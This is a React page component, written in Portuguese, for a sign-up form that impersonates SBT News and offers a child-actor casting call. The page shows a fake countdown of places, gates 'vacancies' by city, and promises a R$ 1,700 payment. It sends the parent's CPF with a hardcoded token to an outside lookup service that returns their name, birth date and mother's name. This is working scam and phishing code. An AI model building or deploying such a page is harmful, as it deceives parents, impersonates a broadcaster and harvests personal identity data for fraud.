import { useState, useEffect } from "react";
import { Link } from "wouter";

interface CepData {
  cep: string;
  logradouro: string;
  complemento: string;
  unidade: string;
  bairro: string;
  localidade: string;
  uf: string;
  estado: string;
  regiao: string;
  ibge: string;
  gia: string;
  ddd: string;
  siafi: string;
  erro?: boolean;
}

export default function Cadastro() {
  const [cep, setCep] = useState("");
  const [loading, setLoading] = useState(false);
  const [vagasDisponiveis, setVagasDisponiveis] = useState<boolean | null>(null);
  const [cidadeInfo, setCidadeInfo] = useState<CepData | null>(null);
  const [cepError, setCepError] = useState("");
  const [quantidadeVagas, setQuantidadeVagas] = useState(17);
  const [loadingStep, setLoadingStep] = useState(0);
  const [showProgressiveData, setShowProgressiveData] = useState<Partial<CepData>>({});
  const [showCostInfo, setShowCostInfo] = useState(false);
  const [showFormulario, setShowFormulario] = useState(false);
  const [cpf, setCpf] = useState("");
  const [nome, setNome] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [nomeMae, setNomeMae] = useState("");
  const [sexo, setSexo] = useState("");
  const [loadingCpf, setLoadingCpf] = useState(false);
  const [cpfStep, setCpfStep] = useState(0);

  const buscarCep = async (cepValue: string) => {
    if (cepValue.length !== 8) return;

    setLoading(true);
    setCepError("");
    setCidadeInfo(null);
    setVagasDisponiveis(null);
    setShowProgressiveData({});
    setLoadingStep(0);
    
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cepValue}/json/`);
      const data: CepData = await response.json();
      
      if (data.erro) {
        setCepError("CEP não encontrado. Verifique e tente novamente.");
        setLoading(false);
        return;
      }

      // Carregamento progressivo em 4 segundos (4 etapas)
      const steps = [
        { cep: data.cep, localidade: data.localidade },
        { ...showProgressiveData, uf: data.uf, estado: data.estado },
        { ...showProgressiveData, regiao: data.regiao, bairro: data.bairro },
        { ...showProgressiveData, logradouro: data.logradouro, ddd: data.ddd }
      ];

      for (let i = 0; i < steps.length; i++) {
        setTimeout(() => {
          setLoadingStep(i + 1);
          setShowProgressiveData(prev => ({ ...prev, ...steps[i] }));
          
          if (i === steps.length - 1) {
            setCidadeInfo(data);
            verificarDisponibilidadeVagas(data);
            setLoading(false);
          }
        }, (i + 1) * 1000);
      }
    } catch (error) {
      setCepError("Erro ao consultar CEP. Tente novamente.");
      setLoading(false);
    }
  };

  const verificarDisponibilidadeVagas = (data: CepData) => {
    // Cidades com vagas disponíveis (capitais e principais cidades)
    const cidadesComVagas = [
      'São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Brasília', 
      'Salvador', 'Fortaleza', 'Recife', 'Porto Alegre', 'Curitiba',
      'Goiânia', 'Belém', 'Manaus', 'São Luís', 'Maceió', 'Natal',
      'João Pessoa', 'Aracaju', 'Teresina', 'Cuiabá', 'Campo Grande',
      'Florianópolis', 'Vitória', 'Palmas', 'Macapá', 'Boa Vista',
      'Rio Branco', 'Porto Velho'
    ];
    
    const temVagas = cidadesComVagas.some(cidade => 
      data.localidade.toLowerCase().includes(cidade.toLowerCase())
    );
    
    setVagasDisponiveis(temVagas);
  };

  const formatarCep = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 8);
    
    // Aplicar máscara: 00000-000
    if (limitado.length > 5) {
      return `${limitado.slice(0, 5)}-${limitado.slice(5)}`;
    }
    return limitado;
  };

  const formatarCpf = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 11);
    
    // Aplicar máscara: 000.000.000-00
    if (limitado.length > 9) {
      return `${limitado.slice(0, 3)}.${limitado.slice(3, 6)}.${limitado.slice(6, 9)}-${limitado.slice(9)}`;
    } else if (limitado.length > 6) {
      return `${limitado.slice(0, 3)}.${limitado.slice(3, 6)}.${limitado.slice(6)}`;
    } else if (limitado.length > 3) {
      return `${limitado.slice(0, 3)}.${limitado.slice(3)}`;
    }
    return limitado;
  };

  const formatarData = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 8);
    
    // Aplicar máscara: 00/00/0000
    if (limitado.length > 4) {
      return `${limitado.slice(0, 2)}/${limitado.slice(2, 4)}/${limitado.slice(4)}`;
    } else if (limitado.length > 2) {
      return `${limitado.slice(0, 2)}/${limitado.slice(2)}`;
    }
    return limitado;
  };

  const scrollToSection = (elementId: string) => {
    setTimeout(() => {
      const element = document.getElementById(elementId);
      if (element) {
        element.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }, 100);
  };

  const buscarDadosCpf = async (cpfValue: string) => {
    const cpfNumeros = cpfValue.replace(/\D/g, '');
    if (cpfNumeros.length !== 11) return;

    setLoadingCpf(true);
    setCpfStep(0);
    
    try {
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cpfNumeros}`);
      const data = await response.json();
      
      if (data.DADOS) {
        const dados = data.DADOS;
        
        // Preenchimento gradual em 4 etapas
        const steps = [
          () => setNome(dados.nome),
          () => {
            const dataFormatada = new Date(dados.data_nascimento).toLocaleDateString('pt-BR');
            setDataNascimento(dataFormatada);
          },
          () => setNomeMae(dados.nome_mae),
          () => setSexo(dados.sexo === 'M' ? 'masculino' : 'feminino')
        ];

        for (let i = 0; i < steps.length; i++) {
          setTimeout(() => {
            setCpfStep(i + 1);
            steps[i]();
            
            if (i === steps.length - 1) {
              setLoadingCpf(false);
            }
          }, (i + 1) * 1000);
        }
      }
    } catch (error) {
      console.error('Erro ao buscar dados do CPF:', error);
      setLoadingCpf(false);
    }
  };

  // Limpar dados quando CEP for alterado
  useEffect(() => {
    setCidadeInfo(null);
    setVagasDisponiveis(null);
    setCepError("");
    setShowProgressiveData({});
    setLoadingStep(0);
  }, [cep]);

  // Timer para diminuir vagas a cada 30 segundos
  useEffect(() => {
    const interval = setInterval(() => {
      setQuantidadeVagas(prev => {
        if (prev > 1) {
          return prev - 1;
        }
        return prev;
      });
    }, 30000); // 30 segundos

    return () => clearInterval(interval);
  }, []);

  // Auto scroll para formulário após 4 segundos quando cost info aparecer
  useEffect(() => {
    if (showCostInfo) {
      const timer = setTimeout(() => {
        setShowFormulario(true);
        scrollToSection('formulario-responsavel');
      }, 4000);

      return () => clearTimeout(timer);
    }
  }, [showCostInfo]);

  // Buscar dados do CPF quando CPF estiver completo
  useEffect(() => {
    const cpfNumeros = cpf.replace(/\D/g, '');
    if (cpfNumeros.length === 11) {
      const timer = setTimeout(() => {
        buscarDadosCpf(cpf);
      }, 500);
      return () => clearTimeout(timer);
    } else {
      // Limpar campos quando CPF for alterado
      setNome("");
      setDataNascimento("");
      setNomeMae("");
      setSexo("");
      setCpfStep(0);
    }
  }, [cpf]);

  return (
    <div className="bg-gray-100 min-h-screen">
      <header className="bg-[#041e41] text-white">
        <div className="p-4 flex justify-between items-center">
          <Link href="/">
            <i className="fas fa-arrow-left text-xl"></i>
          </Link>
          <img alt="SBT News logo" className="h-8" src="/attached_assets/Thays Souza_1750394417652.png" width="auto"/>
          <div className="w-6"></div>
        </div>
      </header>

      <main className="container mx-auto p-4 max-w-2xl">
        <div className="bg-white p-6 rounded-lg shadow-md">
          <h1 className="text-2xl font-bold mb-4 text-center">
            Cadastro para Seleção de Atores Mirins
          </h1>
          
          <div className="mb-6">
            <div className="flex items-center justify-center mb-4">
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-bold mr-2">
                1
              </div>
              <span className="text-sm font-medium">Verificação de Disponibilidade</span>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Digite seu CEP para verificar se há vagas disponíveis em sua região:
              </label>
              <div className="flex gap-2">
                <div className="relative flex-1">
                  <input
                    type="text"
                    value={cep}
                    onChange={(e) => setCep(formatarCep(e.target.value))}
                    placeholder="00000-000"
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    maxLength={9}
                  />
                  {loading && (
                    <div className="absolute right-3 top-2">
                      <i className="fas fa-spinner fa-spin text-blue-500"></i>
                    </div>
                  )}
                </div>
                <button
                  onClick={() => {
                    const cepNumeros = cep.replace(/\D/g, '');
                    if (cepNumeros.length === 8) {
                      buscarCep(cepNumeros);
                    }
                  }}
                  disabled={loading || cep.replace(/\D/g, '').length !== 8}
                  className="px-3 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600 disabled:bg-gray-400 disabled:cursor-not-allowed transition duration-200 flex items-center justify-center"
                >
                  <i className="fas fa-search"></i>
                </button>
              </div>
              {cepError && (
                <p className="text-red-500 text-sm mt-1">{cepError}</p>
              )}
            </div>

            {(loading || Object.keys(showProgressiveData).length > 0) && (
              <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <h3 className="font-medium text-blue-800 mb-2">
                  <i className="fas fa-map-marker-alt mr-2"></i>
                  {loading ? "Carregando localização..." : "Localização encontrada:"}
                </h3>
                <div className="space-y-1 text-sm text-blue-700">
                  {loadingStep >= 1 && (
                    <>
                      <p><strong>CEP:</strong> {showProgressiveData.cep}</p>
                      <p><strong>Cidade:</strong> {showProgressiveData.localidade}</p>
                    </>
                  )}
                  {loadingStep >= 2 && showProgressiveData.uf && (
                    <>
                      <p><strong>UF:</strong> {showProgressiveData.uf}</p>
                      <p><strong>Estado:</strong> {showProgressiveData.estado}</p>
                    </>
                  )}
                  {loadingStep >= 3 && showProgressiveData.regiao && (
                    <>
                      <p><strong>Região:</strong> {showProgressiveData.regiao}</p>
                      {showProgressiveData.bairro && (
                        <p><strong>Bairro:</strong> {showProgressiveData.bairro}</p>
                      )}
                    </>
                  )}
                  {loadingStep >= 4 && (
                    <>
                      {showProgressiveData.logradouro && (
                        <p><strong>Logradouro:</strong> {showProgressiveData.logradouro}</p>
                      )}
                      <p><strong>DDD:</strong> {showProgressiveData.ddd}</p>
                    </>
                  )}
                  {loading && (
                    <div className="flex items-center mt-2">
                      <div className="w-full bg-gray-200 rounded-full h-2">
                        <div 
                          className="bg-blue-600 h-2 rounded-full transition-all duration-1000"
                          style={{ width: `${(loadingStep / 4) * 100}%` }}
                        ></div>
                      </div>
                      <span className="ml-2 text-xs">{loadingStep}/4</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {vagasDisponiveis === true && (
              <div className="mt-6 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                <div className="flex items-center">
                  <i className="fas fa-check-circle text-green-500 mr-2"></i>
                  <h3 className="font-medium text-black">Ótimas notícias!</h3>
                </div>
                <p className="text-sm text-black mt-1">
                  Há vagas disponíveis para sua região. Você pode prosseguir com o cadastro.
                </p>
                <div className="flex items-center mt-2 mb-3">
                  <div className="w-2 h-2 bg-green-500 rounded-full mr-2 animate-pulse-blue"></div>
                  <span className="text-sm font-medium text-black">
                    Existem {quantidadeVagas} vagas disponíveis
                  </span>
                </div>
                <button 
                  onClick={() => {
                    setShowCostInfo(true);
                    scrollToSection('cost-info');
                  }}
                  className="mt-3 px-4 py-2 bg-green-500 text-white rounded-md hover:bg-green-600 transition duration-200"
                >
                  Continuar Cadastro
                </button>
              </div>
            )}

            {showCostInfo && (
              <div id="cost-info" className="mt-6 p-6 bg-white border border-gray-200 rounded-lg">
                <h3 className="font-semibold text-black text-lg mb-4">Informações sobre Custos</h3>
                
                <div className="space-y-3 text-black">
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-blue-500 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <p className="text-sm leading-relaxed font-medium">
                      Custos de transporte e hospedagem são custeados pela emissora
                    </p>
                  </div>
                  
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-blue-500 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <p className="text-sm leading-relaxed font-medium">
                      Ao cadastro ser concluído, você receberá um valor de R$ 1.700,00 como ajuda de custo para deslocamento
                    </p>
                  </div>
                  
                  <div className="flex items-start">
                    <span className="w-2 h-2 bg-blue-500 rounded-full mt-2 mr-3 flex-shrink-0"></span>
                    <p className="text-sm leading-relaxed font-medium">
                      Hospedagem para o adulto responsável e criança dentro da emissora
                    </p>
                  </div>
                </div>
              </div>
            )}

            {showFormulario && (
              <div id="formulario-responsavel" className="mt-6 p-6 bg-white border border-gray-200 rounded-lg">
                <h3 className="font-semibold text-black text-lg mb-4">Dados do Responsável Legal</h3>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      CPF do Responsável Legal:
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cpf}
                        onChange={(e) => setCpf(formatarCpf(e.target.value))}
                        placeholder="000.000.000-00"
                        className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        maxLength={14}
                      />
                      {loadingCpf && (
                        <div className="absolute right-3 top-2">
                          <i className="fas fa-spinner fa-spin text-blue-500"></i>
                        </div>
                      )}
                    </div>
                    {loadingCpf && (
                      <div className="mt-2">
                        <div className="flex items-center text-xs text-blue-600">
                          <div className="w-full bg-gray-200 rounded-full h-1">
                            <div 
                              className="bg-blue-600 h-1 rounded-full transition-all duration-1000"
                              style={{ width: `${(cpfStep / 4) * 100}%` }}
                            ></div>
                          </div>
                          <span className="ml-2">{cpfStep}/4</span>
                        </div>
                        <p className="text-xs text-gray-600 mt-1">Buscando dados automaticamente...</p>
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nome Completo:
                    </label>
                    <input
                      type="text"
                      value={nome}
                      onChange={(e) => setNome(e.target.value)}
                      placeholder="Digite o nome completo"
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 1 ? 'bg-green-50 border-green-300' : ''}`}
                      readOnly={loadingCpf}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Data de Nascimento:
                    </label>
                    <input
                      type="text"
                      value={dataNascimento}
                      onChange={(e) => setDataNascimento(formatarData(e.target.value))}
                      placeholder="00/00/0000"
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 2 ? 'bg-green-50 border-green-300' : ''}`}
                      maxLength={10}
                      readOnly={loadingCpf}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nome da Mãe:
                    </label>
                    <input
                      type="text"
                      value={nomeMae}
                      onChange={(e) => setNomeMae(e.target.value)}
                      placeholder="Digite o nome completo da mãe"
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 3 ? 'bg-green-50 border-green-300' : ''}`}
                      readOnly={loadingCpf}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Sexo:
                    </label>
                    <select
                      value={sexo}
                      onChange={(e) => setSexo(e.target.value)}
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 4 ? 'bg-green-50 border-green-300' : ''}`}
                      disabled={loadingCpf}
                    >
                      <option value="">Selecione o sexo</option>
                      <option value="masculino">Masculino</option>
                      <option value="feminino">Feminino</option>
                    </select>
                  </div>
                </div>
              </div>
            )}

            {vagasDisponiveis === false && (
              <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-lg">
                <div className="flex items-center">
                  <i className="fas fa-times-circle text-red-500 mr-2"></i>
                  <h3 className="font-medium text-red-800">Infelizmente...</h3>
                </div>
                <p className="text-sm text-red-700 mt-1">
                  Não há vagas disponíveis para sua região no momento. Mantenha-se atualizado através do nosso portal para futuras oportunidades.
                </p>
                <Link href="/">
                  <button className="mt-3 px-4 py-2 bg-red-500 text-white rounded-md hover:bg-red-600 transition duration-200">
                    Voltar ao Portal
                  </button>
                </Link>
              </div>
            )}
          </div>

          <div className="mt-8 text-center">
            <p className="text-xs text-gray-500">
              * A verificação de disponibilidade é baseada na localização e demanda regional
            </p>
          </div>
        </div>
      </main>
    </div>
  );
}